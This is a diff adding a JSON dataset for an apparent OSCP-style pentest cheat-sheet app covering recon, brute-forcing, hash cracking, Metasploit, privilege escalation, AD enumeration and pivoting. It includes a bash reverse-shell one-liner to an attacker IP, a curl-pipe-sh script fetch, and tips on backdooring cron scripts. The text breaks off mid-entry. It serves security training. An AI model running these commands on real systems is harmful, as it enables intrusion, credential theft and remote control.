@@ -1,0 +1,1017 @@
+{
+  "version": 1784782827203,
+  "modules": [
+    {
+      "id": "module-recon",
+      "name": "Recon & Scanning",
+      "description": "Active and passive information gathering techniques.",
+      "icon": "Search",
+      "order": 1
+    },
+    {
+      "id": "module-web",
+      "name": "Web Enumeration",
+      "description": "Tools and techniques for analyzing and attacking web applications.",
+      "icon": "Globe",
+      "order": 2
+    },
+    {
+      "id": "module-passwords",
+      "name": "Password Attacks",
+      "description": "Online brute-forcing and offline password cracking.",
+      "icon": "Key",
+      "order": 3
+    },
+    {
+      "id": "module-exploitation",
+      "name": "Exploitation",
+      "description": "Frameworks and exploits to gain initial access.",
+      "icon": "Zap",
+      "order": 4
+    },
+    {
+      "id": "module-privesc-win",
+      "name": "Windows Privilege Escalation",
+      "description": "Techniques to elevate privileges on a Windows host.",
+      "icon": "Shield",
+      "order": 5
+    },
+    {
+      "id": "module-privesc-linux",
+      "name": "Linux Privilege Escalation",
+      "description": "Techniques to elevate privileges on a Linux host.",
+      "icon": "ShieldAlert",
+      "order": 6
+    },
+    {
+      "id": "module-ad",
+      "name": "Active Directory",
+      "description": "Techniques for enumerating and attacking Windows Active Directory domains.",
+      "icon": "Network",
+      "order": 7
+    },
+    {
+      "id": "module-post-exploit",
+      "name": "Post-Exploitation / Pivoting",
+      "description": "Maintaining access, reverse shells, and pivoting through networks.",
+      "icon": "Route",
+      "order": 8
+    },
+    {
+      "id": "module-cracking",
+      "name": "Cracking & Encoding",
+      "description": "Data transformations, encoding/decoding, and hashing.",
+      "icon": "Binary",
+      "order": 9
+    }
+  ],
+  "commands": [
+    {
+      "id": "ad-sharphound-all",
+      "tool": "SharpHound",
+      "category": "Active Directory",
+      "scenario_tags": [
+        "ad",
+        "enumeration",
+        "bloodhound"
+      ],
+      "platform": "windows",
+      "title": "Run Full AD Enumeration (SharpHound)",
+      "command": "Invoke-BloodHound -CollectionMethod All -Domain <domain.local> -ZipFileName <output.zip>",
+      "description": "Executes the SharpHound ingestor using the 'All' collection method. It gathers users, groups, sessions, trusts, and ACLs across the entire domain and packages them into a ZIP file for offline analysis in the BloodHound GUI.",
+      "when_to_use": "Your primary command for mapping an Active Directory environment once you have compromised a domain-joined machine or have valid domain credentials.",
+      "example": "Invoke-BloodHound -CollectionMethod All -Domain corp.local -ZipFileName corp_bloodhound.zip",
+      "common_pitfalls": "The 'All' collection method is extremely noisy and can easily trigger modern EDR alerts due to the massive volume of LDAP queries and remote registry connections.",
+      "further_reading": [
+        {
+          "label": "BloodHound Official Docs",
+          "url": "https://bloodhound.readthedocs.io/en/latest/"
+        }
+      ]
+    },
+    {
+      "id": "ad-ldapsearch-users",
+      "tool": "ldapsearch",
+      "category": "Active Directory",
+      "scenario_tags": [
+        "ad",
+        "enumeration",
+        "ldap"
+      ],
+      "platform": "linux",
+      "title": "Extract All Domain Users via LDAP",
+      "command": "ldapsearch -x -h <domain_controller_ip> -b \"DC=<domain>,DC=<local>\" -D \"<domain>\\<username>\" -w '<password>' \"(objectClass=user)\" sAMAccountName",
+      "description": "Connects to the Domain Controller via LDAP using valid credentials to dump a list of all user accounts (specifically extracting the sAMAccountName attribute) in the domain.",
+      "when_to_use": "When you are attacking from a Linux machine and have obtained low-privileged AD credentials, and you need a valid list of usernames for password spraying or AS-REP Roasting.",
+      "example": "ldapsearch -x -h 10.10.10.100 -b \"DC=corp,DC=local\" -D \"corp\\jsmith\" -w 'Password123!' \"(objectClass=user)\" sAMAccountName"
+    },
+    {
+      "id": "ad-net-domain-admins",
+      "tool": "net",
+      "category": "Active Directory",
+      "scenario_tags": [
+        "ad",
+        "enumeration",
+        "cmd"
+      ],
+      "platform": "windows",
+      "title": "List Domain Admins",
+      "command": "net group \"Domain Admins\" /domain",
+      "description": "Queries the Domain Controller to list the direct members of the highly privileged 'Domain Admins' group.",
+      "when_to_use": "Use this to identify your ultimate high-value targets within the network. These are the users you want to avoid attacking directly, but whose sessions you want to steal.",
+      "example": "net group \"Domain Admins\" /domain",
+      "common_pitfalls": "This only shows direct members. Nested groups (e.g., an 'IT_Admins' group placed inside 'Domain Admins') will not be recursively expanded by this command."
+    },
+    {
+      "id": "encode-base64",
+      "tool": "base64",
+      "category": "Cracking & Encoding",
+      "scenario_tags": [
+        "encoding",
+        "base64"
+      ],
+      "platform": "linux",
+      "title": "Base64 Encode a String",
+      "command": "echo -n \"<string>\" | base64",
+      "description": "Encodes a plain text string into Base64 format. The '-n' flag is crucial as it prevents 'echo' from appending a hidden newline character, which would drastically alter the resulting Base64 string.",
+      "when_to_use": "Use this to encode payloads or credentials before inserting them into HTTP headers (like Basic Auth) or when passing complex bash payloads through restricted environments.",
+      "example": "echo -n \"admin:password123\" | base64",
+      "common_pitfalls": "Forgetting the '-n' flag is the most common reason encoded payloads fail to execute on the target."
+    },
+    {
+      "id": "decode-base64",
+      "tool": "base64",
+      "category": "Cracking & Encoding",
+      "scenario_tags": [
+        "encoding",
+        "base64",
+        "decoding"
+      ],
+      "platform": "linux",
+      "title": "Base64 Decode a String",
+      "command": "echo -n \"<encoded_string>\" | base64 -d",
+      "description": "Reverses a Base64 encoded string back into plaintext.",
+      "when_to_use": "Use this when you discover suspicious, gibberish-looking text ending in '=' or '==' during enumeration (e.g., in cookies, hidden form fields, or config files).",
+      "example": "echo -n \"YWRtaW46cGFzc3dvcmQxMjM=\" | base64 -d"
+    },
+    {
+      "id": "urlencode-python",
+      "tool": "python3",
+      "category": "Cracking & Encoding",
+      "scenario_tags": [
+        "encoding",
+        "url-encoding",
+        "python"
+      ],
+      "platform": "cross-platform",
+      "title": "URL Encode a String (Python)",
+      "command": "python3 -c \"import urllib.parse; print(urllib.parse.quote('<string>'))\"",
+      "description": "Uses Python's standard library to URL-encode a string, ensuring special characters (like spaces, &, and =) are safely transmitted within an HTTP GET request.",
+      "when_to_use": "Essential when manually constructing complex SQL injection or Cross-Site Scripting (XSS) payloads in the terminal to avoid breaking the HTTP request syntax.",
+      "example": "python3 -c \"import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))\""
+    },
+    {
+      "id": "msf-start",
+      "tool": "Metasploit",
+      "category": "Exploitation",
+      "scenario_tags": [
+        "exploitation",
+        "framework"
+      ],
+      "platform": "cross-platform",
+      "title": "Start MSFConsole",
+      "command": "msfconsole -q",
+      "description": "Launches the Metasploit Framework command-line interface. The '-q' flag starts it in quiet mode, suppressing the large ASCII art banner for a faster, cleaner startup.",
+      "when_to_use": "The starting point for using any Metasploit modules, whether you are generating payloads, catching reverse shells, or launching public exploits.",
+      "example": "msfconsole -q"
+    },
+    {
+      "id": "msf-search",
+      "tool": "Metasploit",
+      "category": "Exploitation",
+      "scenario_tags": [
+        "exploitation",
+        "framework",
+        "search"
+      ],
+      "platform": "cross-platform",
+      "title": "Search for Exploits",
+      "command": "search <keyword> type:exploit",
+      "description": "Queries the internal Metasploit database for modules matching your keyword, specifically filtering the results to only show 'exploit' modules (ignoring scanners or payloads).",
+      "when_to_use": "When you have identified a specific service version (e.g., 'vsftpd 2.3.4' or 'eternalblue') and need to see if Metasploit has a pre-built exploit ready to use.",
+      "example": "search vsftpd type:exploit"
+    },
+    {
+      "id": "msf-use-module",
+      "tool": "Metasploit",
+      "category": "Exploitation",
+      "scenario_tags": [
+        "exploitation",
+        "framework"
+      ],
+      "platform": "cross-platform",
+      "title": "Load and Configure a Module",
+      "command": "use <module_path>\nshow options\nset RHOSTS <target_ip>\nset LHOST <tun0_ip>",
+      "description": "The standard workflow for arming an exploit. You load the module, view its required configuration, and set the remote target (RHOSTS) and your local listening address (LHOST).",
+      "when_to_use": "Every time you decide to launch a specific exploit or scanner within the framework.",
+      "example": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.10.40\nset LHOST tun0",
+      "common_pitfalls": "Forgetting to set LHOST correctly (it often defaults to your eth0 interface, but during VPN engagements it must be set to tun0)."
+    },
+    {
+      "id": "msf-multi-handler",
+      "tool": "Metasploit",
+      "category": "Exploitation",
+      "scenario_tags": [
+        "exploitation",
+        "listener",
+        "meterpreter"
+      ],
+      "platform": "cross-platform",
+      "title": "Setup a Generic Catching Listener",
+      "command": "use exploit/multi/handler\nset PAYLOAD <payload_type>\nset LHOST <listening_ip>\nset LPORT <listening_port>\nexploit -j",
+      "description": "Configures a universal listener designed to catch incoming reverse shells or Meterpreter sessions generated by payloads running outside of Metasploit. The '-j' flag runs it quietly in the background as a job.",
+      "when_to_use": "Essential when you have uploaded a standalone payload (like an msfvenom executable or a web shell) to a target and need a robust way to catch the incoming connection.",
+      "example": "use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST tun0\nset LPORT 4444\nexploit -j"
+    },
+    {
+      "id": "searchsploit-basic",
+      "tool": "searchsploit",
+      "category": "Exploitation",
+      "scenario_tags": [
+        "exploitation",
+        "exploit-db",
+        "offline-search"
+      ],
+      "platform": "linux",
+      "title": "Search Exploit-DB Offline",
+      "command": "searchsploit <search_term>",
+      "description": "Performs a fast, offline search through a local copy of the Exploit Database. It maps keywords to the exact path of the exploit code on your system.",
+      "when_to_use": "Use this constantly during the vulnerability analysis phase to find manual Proof of Concept (PoC) scripts for the software versions you discovered during reconnaissance.",
+      "example": "searchsploit WordPress 5.8",
+      "related_ids": [
+        "searchsploit-mirror"
+      ]
+    },
+    {
+      "id": "searchsploit-mirror",
+      "tool": "searchsploit",
+      "category": "Exploitation",
+      "scenario_tags": [
+        "exploitation",
+        "exploit-db"
+      ],
+      "platform": "linux",
+      "title": "Mirror Exploit Code to Current Directory",
+      "command": "searchsploit -m <exploit_id>",
+      "description": "Copies the specified exploit script from its deeply nested installation directory into your current working directory, so you can safely modify and execute it without altering the master copy.",
+      "when_to_use": "Once searchsploit reveals a promising exploit script, you MUST run this command to grab a copy of it before attempting to compile or edit the code for your specific target.",
+      "example": "searchsploit -m 49876",
+      "common_pitfalls": "Running or compiling exploit code directly in the /usr/share/exploitdb folder requires root and pollutes the database path. Always mirror first."
+    },
+    {
+      "id": "linux-sudo-l",
+      "tool": "sudo",
+      "category": "Linux Privilege Escalation",
+      "scenario_tags": [
+        "linux",
+        "privesc",
+        "enumeration",
+        "sudo"
+      ],
+      "platform": "linux",
+      "title": "Check Sudo Permissions",
+      "command": "sudo -l",
+      "description": "Lists the commands that the current user is permitted to run with elevated privileges (usually as root) via the sudo command.",
+      "when_to_use": "This should be the very first command you type upon gaining a low-privilege shell on a Linux box. If the user can run commands like 'vim', 'awk', or 'nmap' via sudo without a password, you can often break out into a root shell immediately.",
+      "example": "sudo -l",
+      "common_pitfalls": "Often prompts for the user's password. If you don't have the user's password, this check might fail unless the administrator explicitly configured NOPASSWD.",
+      "further_reading": [
+        {
+          "label": "GTFOBins - Sudo break-outs",
+          "url": "https://gtfobins.github.io/"
+        }
+      ]
+    },
+    {
+      "id": "linux-suid-search",
+      "tool": "find",
+      "category": "Linux Privilege Escalation",
+      "scenario_tags": [
+        "linux",
+        "privesc",
+        "enumeration",
+        "suid"
+      ],
+      "platform": "linux",
+      "title": "Search for SUID Binaries",
+      "command": "find / -perm -u=s -type f 2>/dev/null",
+      "description": "Searches the entire file system for executable files that have the Set-User-ID (SUID) bit set. When executed, these files run with the privileges of the file's owner (often root) rather than the user executing them.",
+      "when_to_use": "A fundamental manual check. If you find a non-standard binary (e.g., an outdated version of 'exim4' or a custom backup script) with the SUID bit set, it is a prime target for exploitation.",
+      "example": "find / -perm -u=s -type f 2>/dev/null",
+      "common_pitfalls": "This will return many false positives (like /usr/bin/passwd or /bin/su) which naturally require the SUID bit to function properly. You must filter these out mentally."
+    },
+    {
+      "id": "linux-cron-jobs",
+      "tool": "cat",
+      "category": "Linux Privilege Escalation",
+      "scenario_tags": [
+        "linux",
+        "privesc",
+        "enumeration",
+        "cron"
+      ],
+      "platform": "linux",
+      "title": "View System Cron Jobs",
+      "command": "cat /etc/crontab\nls -la /etc/cron.d/",
+      "description": "Reads the system-wide crontab file and lists the contents of the cron.d directory to reveal scheduled tasks running automatically.",
+      "when_to_use": "Look for scheduled tasks running as root that call scripts with weak permissions. If you can edit a script that root is scheduled to run every 5 minutes, you can simply append a reverse shell payload to it.",
+      "example": "cat /etc/crontab"
+    },
+    {
+      "id": "linux-capabilities",
+      "tool": "getcap",
+      "category": "Linux Privilege Escalation",
+      "scenario_tags": [
+        "linux",
+        "privesc",
+        "enumeration",
+        "capabilities"
+      ],
+      "platform": "linux",
+      "title": "Search for File Capabilities",
+      "command": "getcap -r / 2>/dev/null",
+      "description": "Recursively searches the filesystem for binaries that have been assigned specific Linux capabilities (a modern alternative to the monolithic SUID bit).",
+      "when_to_use": "Crucial for finding stealthy privilege escalation vectors. For example, if the 'tar' or 'python' binary has the 'cap_dac_read_search' capability, you can use it to read any file on the system, including /etc/shadow, without needing full root.",
+      "example": "getcap -r / 2>/dev/null",
+      "common_pitfalls": "Often overlooked by beginners who only focus on SUID files. Capabilities are widely used in containerized environments (like Docker)."
+    },
+    {
+      "id": "linpeas-all",
+      "tool": "LinPEAS",
+      "category": "Linux Privilege Escalation",
+      "scenario_tags": [
+        "linux",
+        "privesc",
+        "automation"
+      ],
+      "platform": "linux",
+      "title": "Run Full LinPEAS Scan",
+      "command": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+      "description": "Downloads and executes the Linux Privilege Escalation Awesome Script. It color-codes the output to highlight the most probable paths to root.",
+      "when_to_use": "The gold standard for automated enumeration. Run this to check for vulnerable kernel versions, misconfigured NFS shares, plaintext passwords in config files, and much more.",
+      "example": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+      "common_pitfalls": "Executing scripts directly from the internet via 'curl | sh' is extremely loud and easily blocked or flagged by enterprise EDR solutions.",
+      "related_ids": [
+        "win-winpeas-all"
+      ]
+    },
+    {
+      "id": "hydra-ssh-brute",
+      "tool": "hydra",
+      "category": "Password Attacks",
+      "scenario_tags": [
+        "passwords",
+        "online-bruteforce",
+        "ssh"
+      ],
+      "platform": "cross-platform",
+      "title": "SSH Brute-Force (Single User, Wordlist)",
+      "command": "hydra -l <username> -P <wordlist> ssh://<target>",
+      "description": "Attempts to brute-force the SSH password for a known username by iterating through a provided wordlist. Hydra is exceptionally fast but easily detected by defensive tools like Fail2Ban.",
+      "when_to_use": "Use this when you have enumerated a valid username on the target (e.g., 'root' or 'admin') and suspect they might be using a weak or default password.",
+      "example": "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.40",
+      "common_pitfalls": "Default thread counts might crash older SSH servers or trigger aggressive lockout policies immediately."
+    },
+    {
+      "id": "hydra-http-post",
+      "tool": "hydra",
+      "category": "Password Attacks",
+      "scenario_tags": [
+        "passwords",
+        "online-bruteforce",
+        "web-login"
+      ],
+      "platform": "cross-platform",
+      "title": "HTTP POST Form Brute-Force",
+      "command": "hydra -l <username> -P <wordlist> <target> http-post-form \"<path>:<post_body>:<failure_string>\"",
+      "description": "Targeting a web application's login form. You must provide the exact HTTP path, the structure of the POST body (with ^USER^ and ^PASS^ as placeholders), and a string that appears only when the login fails.",
+      "when_to_use": "Essential for brute-forcing custom web application logins, WordPress admin panels, or internal portals that do not implement rate limiting or CAPTCHAs.",
+      "example": "hydra -l admin -P rockyou.txt 10.10.10.50 http-post-form \"/login.php:user=^USER^&pass=^PASS^:Incorrect password\"",
+      "common_pitfalls": "Getting the failure string wrong will result in 100% false positives, where Hydra thinks every password worked. Always manually test a failed login first."
+    },
+    {
+      "id": "john-auto",
+      "tool": "John the Ripper",
+      "category": "Password Attacks",
+      "scenario_tags": [
+        "passwords",
+        "offline-cracking",
+        "rockyou"
+      ],
+      "platform": "cross-platform",
+      "title": "Automated Hash Cracking (Wordlist)",
+      "command": "john --wordlist=<wordlist> <hash_file>",
+      "description": "The fundamental command for offline cracking. John the Ripper attempts to automatically identify the hash type in the file and uses the provided wordlist to crack it.",
+      "when_to_use": "Your first step after extracting password hashes (e.g., from an /etc/shadow file or a database dump). If you aren't sure what hash type it is, John is usually very good at guessing.",
+      "example": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"
+    },
+    {
+      "id": "john-show",
+      "tool": "John the Ripper",
+      "category": "Password Attacks",
+      "scenario_tags": [
+        "passwords",
+        "offline-cracking",
+        "results"
+      ],
+      "platform": "cross-platform",
+      "title": "Show Cracked Passwords",
+      "command": "john --show <hash_file>",
+      "description": "Displays the plaintext passwords that have already been successfully cracked and saved in John's internal potfile.",
+      "when_to_use": "Run this after a long cracking session finishes to clearly view the results mapped to their original usernames or identifiers.",
+      "example": "john --show hashes.txt"
+    },
+    {
+      "id": "hashcat-md5",
+      "tool": "hashcat",
+      "category": "Password Attacks",
+      "scenario_tags": [
+        "passwords",
+        "offline-cracking",
+        "gpu"
+      ],
+      "platform": "cross-platform",
+      "title": "Crack MD5 Hashes (Wordlist Mode)",
+      "command": "hashcat -m 0 -a 0 <hash_file> <wordlist>",
+      "description": "Uses Hashcat's immense GPU cracking power to brute-force MD5 hashes (mode 0) using a straight wordlist attack (attack mode 0).",
+      "when_to_use": "When you have a large number of basic MD5 hashes and want to utilize your computer's GPU for maximum cracking speed, which John the Ripper (CPU-focused) cannot match.",
+      "example": "hashcat -m 0 -a 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt",
+      "related_ids": [
+        "john-auto"
+      ],
+      "further_reading": [
+        {
+          "label": "Hashcat Hash Mode Reference",
+          "url": "https://hashcat.net/wiki/doku.php?id=example_hashes"
+        }
+      ]
+    },
+    {
+      "id": "hashcat-ntlm",
+      "tool": "hashcat",
+      "category": "Password Attacks",
+      "scenario_tags": [
+        "passwords",
+        "offline-cracking",
+        "windows-ad"
+      ],
+      "platform": "cross-platform",
+      "title": "Crack Windows NTLM Hashes",
+      "command": "hashcat -m 1000 -a 0 <hash_file> <wordlist>",
+      "description": "Targets the NTLM hash algorithm (mode 1000) used locally by Windows and across Active Directory domains. This is one of the most common and fastest hashes to crack.",
+      "when_to_use": "Immediately after dumping the local SAM database from a Windows machine or extracting the NTDS.dit file from a Domain Controller.",
+      "example": "hashcat -m 1000 -a 0 ntlm_dump.txt rockyou.txt"
+    },
+    {
+      "id": "nc-reverse-shell-listener",
+      "tool": "netcat",
+      "category": "Post-Exploitation / Pivoting",
+      "scenario_tags": [
+        "post-exploit",
+        "reverse-shell",
+        "listener"
+      ],
+      "platform": "cross-platform",
+      "title": "Basic Netcat Listener",
+      "command": "nc -lvnp <port>",
+      "description": "Starts a listening service on the specified port. The flags ensure it listens (l), outputs verbose details (v), does not resolve DNS (n), and specifies the port (p).",
+      "when_to_use": "The universal way to catch a simple, unencrypted reverse shell from a compromised target.",
+      "example": "nc -lvnp 4444",
+      "common_pitfalls": "The resulting shell will be unstable (pressing Ctrl+C will kill the shell entirely). You must immediately upgrade the shell using python or stty."
+    },
+    {
+      "id": "bash-reverse-shell",
+      "tool": "bash",
+      "category": "Post-Exploitation / Pivoting",
+      "scenario_tags": [
+        "post-exploit",
+        "reverse-shell",
+        "payload"
+      ],
+      "platform": "linux",
+      "title": "Bash Reverse Shell One-Liner",
+      "command": "bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1",
+      "description": "Forces the target's bash process to open an interactive session (-i) and redirects all input, output, and error streams directly to a TCP socket connected to the attacker's machine.",
+      "when_to_use": "When you have discovered Remote Code Execution (RCE) on a Linux server and need to quickly transition to an interactive shell.",
+      "example": "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
+      "related_ids": [
+        "nc-reverse-shell-listener"
+      ]
+    },
+    {
+      "id": "chisel-server",
+      "tool": "chisel",
+      "category": "Post-Exploitation / Pivoting",
+      "scenario_tags": [
+        "post-exploit",
+        "pivoting",
+        "tunneling"
+      ],
+      "platform": "cross-platform",
+      "title": "Start Chisel Server (Reverse Port Forwarding)",
+      "command": "chisel server -p <port> --reverse",
+      "description": "Starts a Chisel server on your attacker machine configured to accept reverse tunnels. This is essential for bypassing inbound firewall rules on the target network.",
+      "when_to_use": "Run this on your Kali machine before executing the Chisel client on the compromised internal server.",
+      "example": "chisel server -p 8000 --reverse"
+    },
+    {
+      "id": "chisel-client-socks",
+      "tool": "chisel",
+      "category": "Post-Exploitation / Pivoting",
+      "scenario_tags": [
+        "post-exploit",
+        "pivoting",
+        "tunneling"
+      ],
+      "platform": "cross-platform",
+      "title": "Create SOCKS5 Proxy Pivot",
+      "command": "chisel client <attacker_ip>:<attacker_server_port> R:socks",
+      "description": "Connects back to the attacker's Chisel server and establishes a dynamic SOCKS5 proxy (usually binding to port 1080 on the attacker's machine).",
+      "when_to_use": "When you have compromised a dual-homed web server and need to proxy your tools (like nmap or proxychains) directly into an internal network that you cannot normally reach.",
+      "example": "chisel client 10.10.14.5:8000 R:socks",
+      "related_ids": [
+        "chisel-server"
+      ]
+    },
+    {
+      "id": "nmap-syn-scan",
+      "tool": "nmap",
+      "category": "Recon & Scanning",
+      "scenario_tags": [
+        "recon",
+        "port-scanning",
+        "stealth",
+        "oscp-prep"
+      ],
+      "platform": "cross-platform",
+      "title": "Stealth SYN Scan (Top 1000 Ports)",
+      "command": "sudo nmap -sS -T4 <target>",
+      "description": "Performs a fast TCP SYN scan against the top 1000 most common ports. This is often referred to as a 'stealth' scan because it never completes the full TCP three-way handshake.",
+      "when_to_use": "Use this as your initial port scanning technique when you have root/Administrator privileges on your attacking machine and want a rapid overview of open ports without creating full TCP connection logs on the target.",
+      "example": "sudo nmap -sS -T4 192.168.1.100",
+      "common_pitfalls": "Requires root/sudo privileges to construct raw packets. Modern firewalls/IDS will still easily detect this.",
+      "related_ids": [
+        "nmap-full-tcp",
+        "nmap-udp-scan",
+        "masscan-fast-tcp"
+      ]
+    },
+    {
+      "id": "nmap-full-tcp",
+      "tool": "nmap",
+      "category": "Recon & Scanning",
+      "scenario_tags": [
+        "recon",
+        "port-scanning",
+        "service-detection",
+        "oscp-prep"
+      ],
+      "platform": "cross-platform",
+      "title": "Full TCP Port Scan with Service Detection",
+      "command": "nmap -p- -sC -sV -T4 -v <target>",
+      "description": "Scans all 65,535 TCP ports on a target. It also runs default enumeration scripts (-sC) and attempts to determine the exact version of the services running (-sV) on open ports.",
+      "when_to_use": "Use this after an initial fast scan reveals some open ports, and you need a comprehensive view of the entire TCP attack surface including obscure high-numbered ports.",
+      "example": "nmap -p- -sC -sV -T4 -v 10.10.10.25",
+      "common_pitfalls": "This scan is extremely slow compared to top-1000 port scans. It is also highly visible and noisy."
+    },
+    {
+      "id": "nmap-udp-scan",
+      "tool": "nmap",
+      "category": "Recon & Scanning",
+      "scenario_tags": [
+        "recon",
+        "port-scanning",
+        "udp"
+      ],
+      "platform": "cross-platform",
+      "title": "Top 100 UDP Port Scan",
+      "command": "sudo nmap -sU --top-ports 100 <target>",
+      "description": "Performs a UDP scan against the 100 most commonly used UDP ports. UDP scanning is fundamentally different and often much slower than TCP scanning due to the lack of connection state.",
+      "when_to_use": "Essential for discovering services that exclusively use UDP, such as SNMP, TFTP, or early versions of DNS, which would be entirely missed by standard TCP scans.",
+      "example": "sudo nmap -sU --top-ports 100 10.129.2.14",
+      "common_pitfalls": "Extremely slow. Often blocked by ICMP rate limiting on the target, resulting in many false positives ('open|filtered'). Always verify UDP results."
+    },
+    {
+      "id": "nmap-ping-sweep",
+      "tool": "nmap",
+      "category": "Recon & Scanning",
+      "scenario_tags": [
+        "recon",
+        "host-discovery",
+        "internal-network"
+      ],
+      "platform": "cross-platform",
+      "title": "Ping Sweep for Host Discovery",
+      "command": "nmap -sn <target_subnet>",
+      "description": "Sends ICMP echo requests and TCP ACKs to a subnet to determine which hosts are currently online, without performing any actual port scanning.",
+      "when_to_use": "Use this when you first land on an internal network segment and need a quick map of live IP addresses to target for deeper enumeration.",
+      "example": "nmap -sn 192.168.1.0/24",
+      "common_pitfalls": "Windows Firewall blocks ICMP echo requests by default, meaning Windows hosts might appear 'down' even if they are active.",
+      "related_ids": [
+        "nmap-syn-scan"
+      ]
+    },
+    {
+      "id": "nmap-vuln-scan",
+      "tool": "nmap",
+      "category": "Recon & Scanning",
+      "scenario_tags": [
+        "recon",
+        "vulnerability-scanning",
+        "nmap-scripts"
+      ],
+      "platform": "cross-platform",
+      "title": "Nmap Vulnerability Script Scan",
+      "command": "nmap --script vuln <target>",
+      "description": "Executes a broad suite of Nmap Scripting Engine (NSE) scripts categorized as 'vuln'. These scripts actively check target services for known vulnerabilities, such as MS17-010 or Heartbleed.",
+      "when_to_use": "Run this after you have identified specific open ports and services, to automatically check if any of them suffer from easily identifiable, high-profile CVEs.",
+      "example": "nmap --script vuln 10.10.10.5",
+      "common_pitfalls": "These scripts can be very noisy and occasionally crash fragile, legacy services. Not recommended for stealthy red team engagements."
+    },
+    {
+      "id": "masscan-fast-tcp",
+      "tool": "masscan",
+      "category": "Recon & Scanning",
+      "scenario_tags": [
+        "recon",
+        "port-scanning",
+        "external-network",
+        "high-speed"
+      ],
+      "platform": "linux",
+      "title": "High-Speed TCP Port Scan",
+      "command": "sudo masscan -p<ports> <target> --rate=<packet_rate>",
+      "description": "An incredibly fast, asynchronous port scanner capable of scanning the entire internet in under six minutes. It works by bypassing the host operating system's TCP/IP stack and generating raw packets.",
+      "when_to_use": "Use Masscan when you need to discover open ports across massive external network ranges (e.g., a /16 or /8 subnet) where Nmap would be impractically slow.",
+      "example": "sudo masscan -p1-65535 10.0.0.0/8 --rate=100000",
+      "common_pitfalls": "Setting the rate too high will overwhelm your own router or the target network, causing packet loss and leading you to miss open ports.",
+      "related_ids": [
+        "nmap-syn-scan",
+        "nmap-full-tcp"
+      ]
+    },
+    {
+      "id": "whois-domain",
+      "tool": "whois",
+      "category": "Recon & Scanning",
+      "scenario_tags": [
+        "recon",
+        "osint",
+        "external-network"
+      ],
+      "platform": "linux",
+      "title": "Query Domain Registration Details",
+      "command": "whois <domain>",
+      "description": "Queries the public WHOIS databases to retrieve registration records for a specific domain name, including registrar details, creation/expiration dates, and name servers.",
+      "when_to_use": "This is one of the very first steps in external OSINT. It helps you identify the target organization's registered infrastructure, hosting providers, and potentially technical contact emails.",
+      "example": "whois example.com",
+      "common_pitfalls": "Modern privacy protections (like GDPR or domain privacy services) often redact the most useful personal contact information from these records."
+    },
+    {
+      "id": "dig-any",
+      "tool": "dig",
+      "category": "Recon & Scanning",
+      "scenario_tags": [
+        "recon",
+        "dns-enumeration",
+        "external-network"
+      ],
+      "platform": "linux",
+      "title": "Query All DNS Records",
+      "command": "dig ANY <domain> @<nameserver>",
+      "description": "Requests all available DNS record types (A, AAAA, MX, TXT, NS, etc.) for a specific domain name from a designated nameserver.",
+      "when_to_use": "Use this during external reconnaissance to map out subdomains, mail servers, and text records (which sometimes contain sensitive keys or internal IP addresses).",
+      "example": "dig ANY example.com @8.8.8.8",
+      "common_pitfalls": "Many modern DNS servers block 'ANY' queries to prevent DNS amplification DDoS attacks. You may need to query specific record types (like MX or TXT) individually.",
+      "related_ids": [
+        "dig-axfr",
+        "nslookup-interactive"
+      ]
+    },
+    {
+      "id": "dig-axfr",
+      "tool": "dig",
+      "category": "Recon & Scanning",
+      "scenario_tags": [
+        "recon",
+        "dns-enumeration",
+        "zone-transfer"
+      ],
+      "platform": "linux",
+      "title": "DNS Zone Transfer Attempt",
+      "command": "dig axfr <domain> @<nameserver>",
+      "description": "Attempts a full DNS Zone Transfer (AXFR) from a target nameserver. If misconfigured, the server will dump its entire database of DNS records for the domain to your machine.",
+      "when_to_use": "Always attempt this when you discover an authoritative nameserver for a target domain. While rare today, a successful zone transfer instantly reveals the organization's entire external (and sometimes internal) DNS footprint.",
+      "example": "dig axfr zonetransfer.me @nsztm1.digi.ninja",
+      "common_pitfalls": "Almost always fails (Refused) on modern networks because zone transfers should only be allowed between authorized primary and secondary DNS servers."
+    },
+    {
+      "id": "nslookup-interactive",
+      "tool": "nslookup",
+      "category": "Recon & Scanning",
+      "scenario_tags": [
+        "recon",
+        "dns-enumeration",
+        "windows-native"
+      ],
+      "platform": "cross-platform",
+      "title": "Interactive DNS Queries",
+      "command": "nslookup\n> set type=<record_type>\n> <domain>",
+      "description": "Starts nslookup in an interactive shell, allowing you to continually query different DNS record types (like MX or TXT) against various domains without retyping the command structure.",
+      "when_to_use": "Particularly useful on restricted Windows environments during post-exploitation where 'dig' is not installed, but you still need to enumerate internal DNS records.",
+      "example": "nslookup\n> set type=TXT\n> internal.corp.local",
+      "related_ids": [
+        "dig-any"
+      ]
+    },
+    {
+      "id": "ffuf-dir-fuzz",
+      "tool": "ffuf",
+      "category": "Web Enumeration",
+      "scenario_tags": [
+        "web",
+        "directory-bruteforce",
+        "fuzzing"
+      ],
+      "platform": "cross-platform",
+      "title": "Directory and File Fuzzing",
+      "command": "ffuf -w <wordlist> -u http://<target>/FUZZ",
+      "description": "Uses a highly optimized Go-based engine to rapidly request URL paths by replacing the 'FUZZ' keyword with entries from a provided wordlist, effectively brute-forcing hidden directories and files.",
+      "when_to_use": "This is your primary tool for mapping out the hidden attack surface of a web application. Run this immediately against any discovered web server to find admin panels, backups, or undocumented APIs.",
+      "example": "ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.10/FUZZ",
+      "common_pitfalls": "Failing to filter out false positives. If the server returns a 200 OK for every non-existent page, you must use the '-fc' (filter code) or '-fs' (filter size) flags to hide the noise."
+    },
+    {
+      "id": "ffuf-vhost-fuzz",
+      "tool": "ffuf",
+      "category": "Web Enumeration",
+      "scenario_tags": [
+        "web",
+        "vhost-bruteforce",
+        "fuzzing"
+      ],
+      "platform": "cross-platform",
+      "title": "Virtual Host (VHost) Fuzzing",
+      "command": "ffuf -w <wordlist> -u http://<target> -H \"Host: FUZZ.<target>\"",
